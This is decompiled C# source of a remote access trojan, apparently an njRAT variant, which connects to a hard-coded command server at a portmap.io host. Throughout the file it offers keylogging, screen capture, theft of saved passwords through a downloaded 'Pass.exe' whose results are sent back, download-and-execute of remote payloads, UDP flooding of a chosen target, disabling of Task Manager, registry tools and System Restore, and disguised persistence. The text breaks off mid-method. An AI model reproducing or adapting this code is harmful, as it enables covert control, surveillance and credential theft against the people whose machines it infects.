using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using w.My;

namespace w;

public class OK
{
	public static string TIP;

	public static string Tport;

	public static int delay;

	public static bool udp;

	private static byte[] b = new byte[5121];

	public static bool BD = Conversions.ToBoolean("False");

	public static TcpClient C = null;

	public static bool Cn = false;

	public static string DR = "AppData";

	public static string EXE = "taskhostwe.exe";

	public static Computer F = new Computer();

	public static FileStream FS;

	private static string H = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(MH(HH)))));

	public static string HH = "bujyriy-45592.portmap.io";

	public static bool Idr = Conversions.ToBoolean("True");

	public static bool IsF = Conversions.ToBoolean("False");

	public static bool Isu = Conversions.ToBoolean("True");

	public static kl kq = null;

	private static string lastcap = "";

	public static FileInfo LO = new FileInfo(Assembly.GetEntryAssembly()!.Location);

	private static MemoryStream MeM = new MemoryStream();

	public static object MT = null;

	public static int NH = 0;

	public static string P = "45592";

	public static object PLG = null;

	public static string RG = "145565b790d9e9f6e0388ad9d1de88e7";

	public static string sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	public static string sizk = "500";

	public static string VN = "T2ZmaWNlMDQ=";

	public static string VR = "im523";

	public static string Y = "|'|'|";

	public static bool HD = Conversions.ToBoolean("True");

	public static string anti = "Exsample.exe";

	public static bool anti2 = Conversions.ToBoolean("False");

	public static bool usb = Conversions.ToBoolean("False");

	public static string usbx = "svchost.exe";

	public static bool task = Conversions.ToBoolean("True");

	public static mgr mg = null;

	[DebuggerNonUserCode]
	public OK()
	{
	}

	private static void im(object a0)
	{
		Ind((byte[])a0);
	}

	private static void im(object sender, SessionEndingEventArgs e)
	{
		ED();
	}

	public static string ACT()
	{
		string result;
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			if (foregroundWindow == IntPtr.Zero)
			{
				return "";
			}
			string WinTitle = Strings.Space(checked(GetWindowTextLengthA((long)foregroundWindow) + 1));
			GetWindowTextA(foregroundWindow, ref WinTitle, WinTitle.Length);
			result = ENB(ref WinTitle);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			result = "";
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string BS(ref byte[] B)
	{
		return Encoding.UTF8.GetString(B);
	}

	public static bool Cam()
	{
		checked
		{
			try
			{
				int num = 0;
				do
				{
					short wDriver = (short)num;
					string lpszName = Strings.Space(100);
					string lpszVer = null;
					if (!capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long hwnd);

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	private static bool CompDir(FileInfo F1, FileInfo F2)
	{
		if (Operators.CompareString(F1.get_Name().ToLower(), F2.get_Name().ToLower(), false) == 0)
		{
			DirectoryInfo directoryInfo = F1.Directory;
			DirectoryInfo directoryInfo2 = F2.Directory;
			do
			{
				if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
				{
					directoryInfo = directoryInfo.Parent;
					directoryInfo2 = directoryInfo2.Parent;
					if (!(directoryInfo == null && directoryInfo2 == null))
					{
						if (directoryInfo == null)
						{
							return false;
						}
						continue;
					}
					return true;
				}
				return false;
			}
			while (directoryInfo2 != null);
		}
		return false;
	}

	public static bool connect()
	{
		Cn = false;
		Thread.Sleep(2000);
		FileInfo lO = LO;
		lock (lO)
		{
			try
			{
				if (C != null)
				{
					try
					{
						C.Close();
						C = null;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					MeM.Dispose();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				MeM = new MemoryStream();
				C = new TcpClient();
				C.ReceiveBufferSize = 204800;
				C.SendBufferSize = 204800;
				C.Client.SendTimeout = 10000;
				C.Client.ReceiveTimeout = 10000;
				NewLateBinding.LateCall((object)C, (Type)null, "Connect", new object[2]
				{
					RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(MH(HH)))),
					Conversions.ToInteger(P)
				}, (string[])null, (Type[])null, (bool[])null, true);
				H = Conversions.ToString(RuntimeHelpers.GetObjectValue(MH(HH)));
				Cn = true;
				Send(inf());
				try
				{
					string text = default(string);
					if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(GTV("vn", "")), (object)"", false))
					{
						text = text + DEB(ref VN) + "\r\n";
					}
					else
					{
						string text2 = text;
						string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(GTV("vn", "")));
						text = text2 + DEB(ref s) + "\r\n";
					}
					text = string.Concat(text + H + ":" + P + "\r\n", DR, "\r\n", EXE, "\r\n", Conversions.ToString(Idr), "\r\n", Conversions.ToString(IsF), "\r\n", Conversions.ToString(Isu), "\r\n", Conversions.ToString(BD), "\r\n", Conversions.ToString(HD), "\r\n", Conversions.ToString(usb), "\r\n", Conversions.ToString(anti2), "\r\n", Conversions.ToString(task));
					Send("inf" + Y + ENB(ref text));
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				Cn = false;
				ProjectData.ClearProjectError();
			}
		}
		return Cn;
	}

	public static string DEB(ref string s)
	{
		byte[] B = Convert.FromBase64String(s);
		return BS(ref B);
	}

	public static void DLV(string n)
	{
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("Software\\" + RG, writable: true)!.DeleteValue(n);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void ED()
	{
		pr(0);
	}

	public static string ENB(ref string s)
	{
		return Convert.ToBase64String(SB(ref s));
	}

	public static object GTV(string n, object ret)
	{
		try
		{
			return ((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("Software\\" + RG)!.GetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret))));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return ret;
		}
	}

	public static string HWD()
	{
		string result;
		try
		{
			string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
			string lpVolumeNameBuffer = null;
			int lpMaximumComponentLength = 0;
			int lpFileSystemFlags = 0;
			string lpFileSystemNameBuffer = null;
			int lpVolumeSerialNumber = default(int);
			GetVolumeInformationA(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
			result = Conversion.Hex(lpVolumeSerialNumber);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			result = "ERR";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static object MH(string H)
	{
		string[] array = Strings.Split(H, ",", -1, (CompareMethod)0);
		if (NH >= array.Length)
		{
			NH = 0;
		}
		return array[NH];
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int BlockInput(int fBlock);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long SwapMouseButton(long bSwap);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern void SendMessage(int hWnd, uint msg, uint wParam, int lparam);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpCommandString, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpReturnString, long uReturnLength, long hwndCallback);

	[DllImport("KERNEL32.DLL")]
	public static extern void Beep(int freq, int dur);

	public static void AddHome(string text)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\Main", writable: true);
		registryKey.SetValue("Start Page", text);
	}

	public static void Ind(byte[] b)
	{
		//IL_013d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Unknown result type (might be due to invalid IL or missing references)
		//IL_016d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0185: Unknown result type (might be due to invalid IL or missing references)
		//IL_019f: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0212: Unknown result type (might be due to invalid IL or missing references)
		//IL_021a: Unknown result type (might be due to invalid IL or missing references)
		//IL_021c: Unknown result type (might be due to invalid IL or missing references)
		//IL_021e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ecb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ed2: Expected O, but got Unknown
		//IL_0f50: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f57: Expected O, but got Unknown
		string[] array = Strings.Split(BS(ref b), Y, -1, (CompareMethod)0);
		checked
		{
			try
			{
				string text = array[0];
				string text2 = text;
				if (Operators.CompareString(text2, "nwpr", false) == 0)
				{
					Process.Start(array[1]);
				}
				else if (Operators.CompareString(text2, "site", false) == 0)
				{
					Send("site");
				}
				else if (Operators.CompareString(text2, "fun", false) == 0)
				{
					Send("fun");
				}
				else if (Operators.CompareString(text2, "IEhome", false) == 0)
				{
					AddHome(array[1]);
				}
				else if (Operators.CompareString(text2, "shutdowncomputer", false) == 0)
				{
					Interaction.Shell("shutdown -s -t 00", (AppWinStyle)0, false, -1);
				}
				else if (Operators.CompareString(text2, "restartcomputer", false) == 0)
				{
					Interaction.Shell("shutdown -r -t 00", (AppWinStyle)0, false, -1);
				}
				else if (Operators.CompareString(text2, "logoff", false) == 0)
				{
					Interaction.Shell("shutdown -l -t 00", (AppWinStyle)0, false, -1);
				}
				else if (Operators.CompareString(text2, "ErorrMsg", false) == 0)
				{
					MessageBoxIcon val = default(MessageBoxIcon);
					switch (array[1])
					{
					case "1":
						val = (MessageBoxIcon)64;
						break;
					case "2":
						val = (MessageBoxIcon)32;
						break;
					case "3":
						val = (MessageBoxIcon)48;
						break;
					case "4":
						val = (MessageBoxIcon)16;
						break;
					}
					MessageBoxButtons val2 = default(MessageBoxButtons);
					switch (array[2])
					{
					case "1":
						val2 = (MessageBoxButtons)4;
						break;
					case "2":
						val2 = (MessageBoxButtons)3;
						break;
					case "3":
						val2 = (MessageBoxButtons)0;
						break;
					case "4":
						val2 = (MessageBoxButtons)1;
						break;
					case "5":
						val2 = (MessageBoxButtons)5;
						break;
					case "6":
						val2 = (MessageBoxButtons)2;
						break;
					}
					MessageBox.Show(array[4], array[3], val2, val);
				}
				else if (Operators.CompareString(text2, "peech", false) == 0)
				{
					object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice", ""));
					object[] array2 = new object[1];
					string[] array3 = array;
					string[] array4 = array3;
					int num = 1;
					array2[0] = array4[1];
					object[] array5 = array2;
					object[] array6 = array5;
					bool[] array7 = new bool[1] { true };
					NewLateBinding.LateCall(objectValue, (Type)null, "speak", array6, (string[])null, (Type[])null, array7, true);
					if (array7[0])
					{
						array3[num] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
					}
				}
				else if (Operators.CompareString(text2, "BepX", false) == 0)
				{
					Beep((int)Math.Round(Conversion.Val(array[1])), (int)Math.Round(Conversion.Val(array[2])));
				}
				else if (Operators.CompareString(text2, "piano", false) == 0)
				{
					Beep((int)Math.Round(Conversion.Val(array[1])), 300);
				}
				else if (Operators.CompareString(text2, "OpenCD", false) == 0)
				{
					string lpCommandString = "set CDAudio door open";
					string lpReturnString = "";
					mciSendStringA(ref lpCommandString, ref lpReturnString, 0L, 0L);
				}
				else if (Operators.CompareString(text2, "CloseCD", false) == 0)
				{
					string lpReturnString = "set CDAudio door closed";
					string lpCommandString = "";
					mciSendStringA(ref lpReturnString, ref lpCommandString, 0L, 0L);
				}
				else if (Operators.CompareString(text2, "DisableKM", false) == 0)
				{
					BlockInput(1);
				}
				else if (Operators.CompareString(text2, "EnableKM", false) == 0)
				{
					BlockInput(0);
				}
				else if (Operators.CompareString(text2, "TurnOffMonitor", false) == 0)
				{
					SendMessage(-1, 274u, 61808u, 2);
				}
				else if (Operators.CompareString(text2, "TurnOnMonitor", false) == 0)
				{
					SendMessage(-1, 274u, 61808u, -1);
				}
				else if (Operators.CompareString(text2, "NormalMouse", false) == 0)
				{
					SwapMouseButton(0L);
				}
				else if (Operators.CompareString(text2, "ReverseMouse", false) == 0)
				{
					SwapMouseButton(256L);
				}
				else if (Operators.CompareString(text2, "DisableCMD", false) == 0)
				{
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"1", RegistryValueKind.DWord);
				}
				else if (Operators.CompareString(text2, "EnableCMD", false) == 0)
				{
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"0", RegistryValueKind.DWord);
				}
				else if (Operators.CompareString(text2, "DisableRegistry", false) == 0)
				{
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"1", RegistryValueKind.DWord);
				}
				else if (Operators.CompareString(text2, "EnableRegistry", false) == 0)
				{
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"0", RegistryValueKind.DWord);
				}
				else if (Operators.CompareString(text2, "DisableRestore", false) == 0)
				{
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
				}
				else if (Operators.CompareString(text2, "EnableRestore", false) == 0)
				{
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"0", RegistryValueKind.DWord);
				}
				else if (Operators.CompareString(text2, "DisableTaskManager", false) == 0)
				{
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"1", RegistryValueKind.DWord);
				}
				else if (Operators.CompareString(text2, "EnableTaskManager", false) == 0)
				{
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"0", RegistryValueKind.DWord);
				}
				else if (Operators.CompareString(text2, "CursorShow", false) == 0)
				{
					Cursor.Show();
				}
				else if (Operators.CompareString(text2, "CursorHide", false) == 0)
				{
					Cursor.Hide();
				}
				else if (Operators.CompareString(text2, "sendmusicplay", false) == 0)
				{
					File.WriteAllBytes(Path.GetTempPath() + array[1], Convert.FromBase64String(array[2]));
					Thread.Sleep(1000);
					((Computer)MyProject.Computer).get_Audio().Stop();
					((Computer)MyProject.Computer).get_Audio().Play(Path.GetTempPath() + array[1], (AudioPlayMode)1);
				}
				else if (Operators.CompareString(text2, "OpenSite", false) == 0)
				{
					Process.Start(array[1]);
				}
				else if (Operators.CompareString(text2, "dos", false) == 0)
				{
					Send("dos");
				}
				else if (Operators.CompareString(text2, "udp", false) == 0)
				{
					Send("udp");
					TIP = array[1];
					Tport = array[2];
					delay = Conversions.ToInteger(array[3]);
					udp = true;
					try
					{
						while (udp)
						{
							try
							{
								IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(TIP), Conversions.ToInteger(Tport));
								byte[] buffer = new byte[4096];
								Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
								socket.SendTo(buffer, remoteEP);
								Thread.Sleep(delay);
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "udpstp", false) == 0)
				{
					udp = false;
				}
				else if (Operators.CompareString(text2, "pingstop", false) == 0)
				{
					Interaction.Shell("taskkill /F /IM PING.EXE", (AppWinStyle)0, false, -1);
				}
				else
				{
					if (Operators.CompareString(text2, "ll", false) == 0)
					{
						Cn = false;
						return;
					}
					if (Operators.CompareString(text2, "kl", false) == 0)
					{
						Send("kl" + Y + ENB(ref kq.Logs));
						return;
					}
					switch (text2)
					{
					case "pas":
						try
						{
							string text3 = Interaction.Environ("temp") + "/pass.exe";
							if (!File.Exists(text3))
							{
								try
								{
									WebClient webClient = new WebClient();
									webClient.DownloadFile("https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe?dl=0", text3);
									Process.Start(text3);
								}
								catch (Exception projectError3)
								{
									ProjectData.SetProjectError(projectError3);
									ProjectData.ClearProjectError();
								}
							}
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						try
						{
							string path = Interaction.Environ("temp") + "/temp.txt";
							string s = File.ReadAllText(path);
							Send("pas" + Y + ENB(ref s));
							return;
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
							return;
						}
					case "ll":
						Cn = false;
						return;
					case "kl":
						Send("kl" + Y + ENB(ref kq.Logs));
						return;
					case "prof":
						switch (array[1])
						{
						case "~":
							STV(array[2], array[3], RegistryValueKind.String);
							break;
						case "!":
							STV(array[2], array[3], RegistryValueKind.String);
							Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object)("getvalue" + Y + array[1] + Y), RuntimeHelpers.GetObjectValue(GTV(array[1], ""))))));
							break;
						case "@":
							DLV(array[2]);
							break;
						}
						return;
					}
				}
				if (Operators.CompareString(text, "rn", false) != 0)
				{
					switch (text)
					{
					case "inv":
					{
						byte[] array8 = (byte[])GTV(array[1], new byte[0]);
						if ((array[3].Length < 10) & (array8.Length == 0))
						{
							Send("pl" + Y + array[1] + Y + Conversions.ToString(1));
							return;
						}
						if (array[3].Length > 10)
						{
							MemoryStream memoryStream3 = new MemoryStream();
							int length = (array[0] + Y + array[1] + Y + array[2] + Y).Length;
							memoryStream3.Write(b, length, b.Length - length);
							array8 = ZIP(memoryStream3.ToArray());
							STV(array[1], array8, RegistryValueKind.Binary);
						}
						Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
						object objectValue2 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin(array8, "A"))));
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), (Type)null, "h", new object[1] { H }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), (Type)null, "p", new object[1] { P }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), (Type)null, "osk", new object[1] { array[2] }, (string[])null, (Type[])null);
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue2), (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject((object)(!Cn), RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue2), (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)true, false))))))
						{
							Thread.Sleep(1);
						}
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), (Type)null, "off", new object[1] { true }, (string[])null, (Type[])null);
						return;
					}
					case "ret":
					{
						byte[] array9 = (byte[])GTV(array[1], new byte[0]);
						if ((array[2].Length < 10) & (array9.Length == 0))
						{
							Send("pl" + Y + array[1] + Y + Conversions.ToString(1));
							return;
						}
						if (array[2].Length > 10)
						{
							MemoryStream memoryStream4 = new MemoryStream();
							int length2 = (array[0] + Y + array[1] + Y).Length;
							memoryStream4.Write(b, length2, b.Length - length2);
							array9 = ZIP(memoryStream4.ToArray());
							STV(array[1], array9, RegistryValueKind.Binary);
						}
						Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
						object objectValue3 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin(array9, "A"))));
						string[] array3 = new string[5]
						{
							"ret",
							Y,
							array[1],
							Y,
							null
						};
						string[] array10 = array3;
						string lpReturnString = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue3), (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null)));
						array10[4] = ENB(ref lpReturnString);
						Send(string.Concat(array3));
						return;
					}
					case "CAP":
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val3 = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, bounds.Height, (PixelFormat)135173);
						Graphics val4 = Graphics.FromImage((Image)(object)val3);
						Size size = new Size(((Image)val3).get_Width(), ((Image)val3).get_Height());
						val4.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
						try
						{
							bounds = new Rectangle(size: new Size(32, 32), location: Cursor.get_Position());
							Cursors.get_Default().Draw(val4, bounds);
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						val4.Dispose();
						Bitmap val5 = new Bitmap(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
						val4 = Graphics.FromImage((Image)(object)val5);
						val4.DrawImage((Image)(object)val3, 0, 0, ((Image)val5).get_Width(), ((Image)val5).get_Height());
						val4.Dispose();
						MemoryStream memoryStream = new MemoryStream();
						string lpReturnString = "CAP" + Y;
						b = SB(ref lpReturnString);
						memoryStream.Write(b, 0, b.Length);
						MemoryStream memoryStream2 = new MemoryStream();
						((Image)val5).Save((Stream)memoryStream2, ImageFormat.get_Jpeg());
						string text4 = md5(memoryStream2.ToArray());
						if (Operators.CompareString(text4, lastcap, false) != 0)
						{
							lastcap = text4;
							memoryStream.Write(memoryStream2.ToArray(), 0, (int)memoryStream2.Length);
						}
						else
						{
							memoryStream.WriteByte(0);
						}
						Sendb(memoryStream.ToArray());
						memoryStream.Dispose();
						memoryStream2.Dispose();
						((Image)val3).Dispose();
						((Image)val5).Dispose();
						return;
					}
					case "un":
						switch (array[1])
						{
						case "~":
							UNS();
							break;
						case "!":
							pr(0);
							ProjectData.EndApp();
							break;
						case "@":
							pr(0);
							Process.Start(LO.FullName);
							ProjectData.EndApp();
							break;
						}
						return;
					}
					switch (text)
					{
					case "Ex":
					{
						if (PLG == null)
						{
							Send("PLG");
							int num2 = 0;
							while (!(unchecked(PLG != null || num2 == 20) | !Cn))
							{
								num2++;
								Thread.Sleep(1000);
							}
							if ((PLG == null) | !Cn)
							{
								break;
							}
						}
						object[] array12 = new object[1] { b };
						bool[] array13 = new bool[1] { true };
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "ind", array12, (string[])null, (Type[])null, array13, true);
						if (array13[0])
						{
							b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array12[0]))), typeof(byte[]));
						}
						break;
					}
					case "PLG":
					{
						MemoryStream memoryStream6 = new MemoryStream();
						int length4 = (array[0] + Y).Length;
						memoryStream6.Write(b, length4, b.Length - length4);
						PLG = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Plugin(ZIP(memoryStream6.ToArray()), "A"))));
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "H", new object[1] { H }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "P", new object[1] { P }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(PLG), (Type)null, "c", new object[1] { C }, (string[])null, (Type[])null);
						break;
					}
					case "up":
					{
						byte[] array11 = null;
						if (array[1][0] == '\u001f')
						{
							try
							{
								MemoryStream memoryStream5 = new MemoryStream();
								int length3 = (array[0] + Y).Length;
								memoryStream5.Write(b, length3, b.Length - length3);
								array11 = ZIP(memoryStream5.ToArray());
							}
							catch (Exception projectError7)
							{
								ProjectData.SetProjectError(projectError7);
								Send("MSG" + Y + "Update ERROR");
								Send("bla");
								ProjectData.ClearProjectError();
								break;
							}
						}
						else
						{
							WebClient webClient2 = new WebClient();
							try
							{
								array11 = webClient2.DownloadData(array[1]);
							}
							catch (Exception projectError8)
							{
								ProjectData.SetProjectError(projectError8);
								Send("MSG" + Y + "Update ERROR");
								Send("bla");
								ProjectData.ClearProjectError();
								break;
							}
						}
						Send("bla");
						string text5 = Path.GetTempFileName() + ".exe";
						try
						{
							Send("MSG" + Y + "Updating To " + new FileInfo(text5).get_Name());
							Thread.Sleep(2000);
							File.WriteAllBytes(text5, array11);
							Process.Start(text5, "..");
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							ProjectData.SetProjectError(ex2);
							Exception ex3 = ex2;
							Send("MSG" + Y + "Update ERROR " + ex3.Message);
							ProjectData.ClearProjectError();
							break;
						}
						UNS();
						break;
					}
					}
					return;
				}
				byte[] bytes;
				if (array[2][0] == '\u001f')
				{
					try
					{
						MemoryStream memoryStream7 = new MemoryStream();
						int length5 = (array[0] + Y + array[1] + Y).Length;
						memoryStream7.Write(b, length5, b.Length - length5);
						bytes = ZIP(memoryStream7.ToArray());
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						Send("MSG" + Y + "Execute ERROR");
						Send("bla");
						ProjectData.ClearProjectError();
						return;
					}
				}
				else
				{
					WebClient webClient3 = new WebClient();
					try
					{
						bytes = webClient3.DownloadData(array[2]);
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						Send("MSG" + Y + "Download ERROR");
						Send("bla");
						ProjectData.ClearProjectError();
						return;
					}
				}
				Send("bla");
				string text6 = Path.GetTempFileName() + "." + array[1];
				try
				{
					File.WriteAllBytes(text6, bytes);
					Process.Start(text6);
					Send("MSG" + Y + "Executed As " + new FileInfo(text6).get_Name());
				}
				catch (Exception ex4)
				{
					ProjectData.SetProjectError(ex4);
					Exception ex5 = ex4;
					Exception ex6 = ex5;
					Send("MSG" + Y + "Execute ERROR " + ex6.Message);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex7)
			{
				ProjectData.SetProjectError(ex7);
				Exception ex8 = ex7;
				ProjectData.SetProjectError(ex8);
				Exception ex9 = ex8;
